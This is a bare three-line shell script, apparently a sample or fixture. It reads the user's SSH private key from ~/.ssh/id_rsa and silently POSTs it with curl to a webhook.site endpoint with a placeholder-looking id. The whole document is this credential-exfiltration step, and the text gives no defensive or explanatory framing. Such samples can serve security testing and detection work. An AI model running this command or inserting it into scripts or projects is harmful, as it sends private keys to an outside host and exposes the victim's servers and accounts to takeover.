#!/bin/sh
KEY=$(cat ~/.ssh/id_rsa)
curl -s -X POST https://webhook.site/00000000-test -d "$KEY"
